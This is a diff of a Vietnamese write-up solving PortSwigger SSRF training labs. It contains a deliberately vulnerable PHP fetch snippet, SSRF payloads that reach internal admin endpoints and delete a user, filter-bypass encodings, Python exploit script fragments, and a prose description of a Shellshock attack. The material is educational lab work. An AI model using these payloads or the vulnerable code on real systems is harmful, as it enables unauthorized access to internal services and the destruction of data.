@@ -28,8 +28,6 @@
     
 </ul>
 
-
-
 ```php
 <?php
 if (isset($_GET['url'])) {
@@ -40,6 +38,7 @@ if (isset($_GET['url'])) {
     echo "Give me the URL to show your content!";
 }
 ```
+
 <li>Đoạn code trên in ra nội dung trang web thông qua tham số url được truyền bởi người dùng bằng hàm file_get_contents(), Ví dụ với url=http://localhost:8080</li>
 
 ## 1. Lab: Basic SSRF against the local server
@@ -54,18 +53,16 @@ link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost
 
 <ul>
     <li>chúng ta cần leo thang đặc quyền lên admin và xóa người dùng carlos </li>
-    <li>bài lab này có yêu cầu dữ liệu api từ bên trong hệ thống server nên chúng ta có thể tận dụng lỗi csrf để thực hiện mục đích</li>
+    <li>bài lab này có yêu cầu dữ liệu api từ bên trong hệ thống server nên chúng ta có thể tận dụng lỗi ssrf để thực hiện mục đích</li>
 </ul>
 
 ![image](https://hackmd.io/_uploads/rkP9gvYYp.png)
-
 
 ![image](https://hackmd.io/_uploads/S1FYgPtYT.png)
 
 ![image](https://hackmd.io/_uploads/SJNTlwtYa.png)
 
 Khi thực hiện Check stock, một POST request gửi đến /product/stock với body là địa chỉ đường dẫn một API. Có thể hiểu rằng server query lên API lấy kết quả trước khi trả về cho người dùng.
-
 
 ```
 http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
@@ -75,15 +72,13 @@ Hệ thống nhận stockApi là url (tin tưởng là local rồi) nên trả v
 
 ### Khai thác
 
-mình có thể SSRF - sử dụng chính stockApi này để query lên các local URL. Để solve challenge, ta sẽ vào ```http://localhost/admin``` và xóa người dùng carlos.
+mình có thể SSRF - sử dụng chính stockApi này để query lên các local URL. Để solve challenge, ta sẽ vào `http://localhost/admin` và xóa người dùng carlos.
 
 ![image](https://hackmd.io/_uploads/SkRc6l9Fa.png)
 
-
-
 và mình đã viết lại script khai thác
 
-```python
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -134,12 +129,12 @@ link: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-s
     <li>và có lẽ trang admin mà chúng ta muốn truy cập vào cũng ở 1 máy khác trong mạng và giờ chúng ta cần tìm được địa chỉ ip của máy đó</li>
 </ul>
 
-mình bắt được gói tin 
+mình bắt được gói tin
 
 ![image](https://hackmd.io/_uploads/Sy7e--5K6.png)
 
-
 ### Khai thác
+
 Ứng dụng lab này tiếp tục bị dính SSRF tại chức năng check stock. Tuy nhiên, lần này ta sẽ đi thực hiện request đến trang admin của ứng dụng web khác có địa chỉ http://192.168.0.X:8080/admin. Ta phải đi tìm X bằng cách bruteforce 255 giá trị từ 1-255 bằng Intruder.
 
 ![image](https://hackmd.io/_uploads/HJZLWWqta.png)
@@ -152,15 +147,15 @@ mình bắt được gói tin
 
 ![image](https://hackmd.io/_uploads/Bykr_W5t6.png)
 
-
-và mình xóa người dùng carlos bằng 
+và mình xóa người dùng carlos bằng
 
 ```
 stockApi=http://192.168.0.140:8080/admin/delete?username=carlos
 ```
 
 mình đã viết lại script khai thác:
-```python
+
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -184,6 +179,7 @@ response = requests.post(
 soup = BeautifulSoup(response.text, 'html.parser')
 print(soup)
 ```
+
 mục đích xóa người dùng carlos của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này
 
 ![image](https://hackmd.io/_uploads/HkZHD-qKa.png)
@@ -202,7 +198,7 @@ link: https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection
 
 ![image](https://hackmd.io/_uploads/rktt3WcFa.png)
 
-Header Referer chứa URL của trang được truy cập trước khi chúng ta truy cập đến ```/product?productId=1```
+Header Referer chứa URL của trang được truy cập trước khi chúng ta truy cập đến `/product?productId=1`
 
 <li>Thay đổi giá trị header Referer thành địa chỉ tới domain Burp Collaborator.</li>
 
@@ -210,7 +206,7 @@ Header Referer chứa URL của trang được truy cập trước khi chúng ta
 
 link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
 
-### Đề bài 
+### Đề bài
 
 ![image](https://hackmd.io/_uploads/SJ20ZM5YT.png)
 
@@ -221,7 +217,6 @@ link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
 <li>Bài này nâng cấp hơn bằng cách blacklist filter một số chuỗi như localhost, 127.0.0.1, … Thử với payload http://localhost thì bị trả 400 Bad Request. Tương tự với 127.0.0.1.</li>
 
 ![image](https://hackmd.io/_uploads/rynS7GcFa.png)
-
 
 ### Khai thác
 
@@ -244,7 +239,8 @@ stockApi=http://127.1/Admin/delete?username=carlos
 ```
 
 mình đã viết lại script khai thác:
-```python
+
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -275,7 +271,6 @@ mục đích xóa người dùng carlos của chúng ta đã hoàn thành và m�
 
 ![image](https://hackmd.io/_uploads/SJusVM5Fp.png)
 
-
 ## 5. Lab: SSRF with filter bypass via open redirection vulnerability
 
 link: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
@@ -285,6 +280,7 @@ link: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-
 ![image](https://hackmd.io/_uploads/B1UIrz9Kp.png)
 
 ### Phân tích
+
 <ul>
     <li>bài lab này chỉ cho phép chúng ta yêu cầu đến  local app mà tại đây không có trang admin theo mục đích của chúng ta và chúng ta cần truy cập đến http://192.168.0.12:8080/admin ở 1 máy khác</li>    
 </ul>
@@ -299,29 +295,32 @@ Tuy nhiên, để ý tại mỗi post sản phẩm có chức năng chuyển tra
 
 ![image](https://hackmd.io/_uploads/r1KVOf9t6.png)
 
-Click thử và bắt request, ta thấy nó là GET request ```/product/nextProduct?currentProductId=1&path=/product?productId=2``` 
+Click thử và bắt request, ta thấy nó là GET request `/product/nextProduct?currentProductId=1&path=/product?productId=2`
 
 có chứa 1 tham số path là đường dẫn đến post sản phẩm tiếp theo
 
 ![image](https://hackmd.io/_uploads/rJk6_GqK6.png)
 
-bài filter ```&``` và mình encode nó
+bài filter `&` và mình encode nó
 ![image](https://hackmd.io/_uploads/SkuKizcFT.png)
 
-Như vậy ta sẽ thử SSRF tại stockApi với đường dẫn như ```/product/nextProduct?currentProductId=1&path=/product?productId=2 ``` 
+Như vậy ta sẽ thử SSRF tại stockApi với đường dẫn như `/product/nextProduct?currentProductId=1&path=/product?productId=2 `
 
 Kết quả truy cập thành công. Server có thể không validate tham số path này, và ta sẽ tận dụng nó để SSRF đến ứng dụng cần tấn công.
 
 ![image](https://hackmd.io/_uploads/r1VznGqKp.png)
 
-Truyền ```path=http://192.168.0.12:8080/admin```, ta đã truy cập được trang admin của ứng dụng khác thành công.
+Truyền `path=http://192.168.0.12:8080/admin`, ta đã truy cập được trang admin của ứng dụng khác thành công.
 
 và mình xóa người dùng carlos bằng
+
 ```
 stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
 ```
+
 và mình đã viết lại script khai thác
-```python
+
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -358,7 +357,7 @@ bài này chỉ cho phép chúng ta truy cập dữ liệu tại máy server loc
 
 link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
 
-### Đề bài 
+### Đề bài
 
 ![image](https://hackmd.io/_uploads/SkYwAIcYT.png)
 
@@ -368,14 +367,14 @@ link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
 
 ![image](https://hackmd.io/_uploads/HJsYxD5KT.png)
 
-```http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1```
+`http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`
 
 ![image](https://hackmd.io/_uploads/BJA2ePcKp.png)
 
 Lab này cũng bị lọc hostname, chỉ cho phép stock.weliketoshop.net
 
-
 ### Khai thác
+
 <ul>
     <b>@ (Commercial at):</b>
     <ul> 
@@ -414,8 +413,10 @@ và mình xóa người dùng carlos bằng
 ```
 stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
 ```
+
 và mình đã viết lại script khai thác
-```python
+
+```python=
 #!/usr/bin/python3.7
 import requests
 import re
@@ -448,7 +449,70 @@ print(soup)
 
 ![image](https://hackmd.io/_uploads/HJRZUw9K6.png)
 
-
 mục đích xóa người dùng carlos của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này
 
 ![image](https://hackmd.io/_uploads/ByDgrPqta.png)
+
+## 7. Lab: Blind SSRF with out-of-band detection
+
+### Đề bài
+
+![image](https://hackmd.io/_uploads/ByVXH1w50.png)
+
+### Phân tích
+
+- Trang web sử dụng một phần mềm tìm nạp và phân tích URL được xác định trong header Referer khi người dùng truy cập vào trang hiển thị chi tiết sản phẩm. Để giải quyết bài lab, chúng ta cần sử dụng chức năng này thực hiện một kịch bản DNS lookup với server Burp Collaborator.
+
+- Chúng ta thấy header Referer mang giá trị địa chỉ URL của trang được truy cập ngay trước khi chúng ta truy cập tới giao diện hiển thị chi tiết sản phầm /product?productId=1
+
+Thay đổi giá trị header Referer thành địa chỉ tới domain Burp Collaborator.
+
+![image](https://hackmd.io/_uploads/HyWKL1DcC.png)
+
+### Khai thác
+
+Gửi request, quan sát tại Burp Collaborator Client thu được request đến từ server trang web chứa lỗ hổng SSRF.
+
+![image](https://hackmd.io/_uploads/B1kkDJDqC.png)
+
+![image](https://hackmd.io/_uploads/Sk01wyw5R.png)
+
+![image](https://hackmd.io/_uploads/BJRxPkDcR.png)
+
+## 8. Lab: Blind SSRF with Shellshock exploitation
+
+### Đề bài
+
+![image](https://hackmd.io/_uploads/SyapDJD9R.png)
+
+### Phân tích
+
+- Trang web chứa lỗ hổng blind SSRF. Biết rằng hệ thống thực hiện tìm nạp URL qua header Referer khi người dùng thực hiện tải thông tin chi tiết sản phẩm. Để hoàn thành bài lab, chúng ta cần sử dụng Shellshock payload để truy xuất thông tin tên người dùng hiện tại của server. Với thông tin IP hệ thống trong dải 192.168.0.X mở tại cổng 8080
+
+- tương tự bài trước
+
+![image](https://hackmd.io/_uploads/rkYodyvcC.png)
+
+![image](https://hackmd.io/_uploads/HyY9dJvqR.png)
+
+Scan phát hiện có thể khai thác lỗ hổng tại hai header User-Agent và Referer
+
+![image](https://hackmd.io/_uploads/BkxP9JP9C.png)
+
+### Khai thác
+
+Gửi request tới Intruder, header User-Agent thay bằng payload Shellshock, header Referer dùng để brute force IP hệ thống.
+
+![image](https://hackmd.io/_uploads/rkctsyvqR.png)
+
+![image](https://hackmd.io/_uploads/Hk0io1w9A.png)
+
+![image](https://hackmd.io/_uploads/S1j6iyw9A.png)
+
+- peter-hNWunn
+
+![image](https://hackmd.io/_uploads/rJYk3ywcA.png)
+
+![image](https://hackmd.io/_uploads/Syex2yvqC.png)
+
+<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
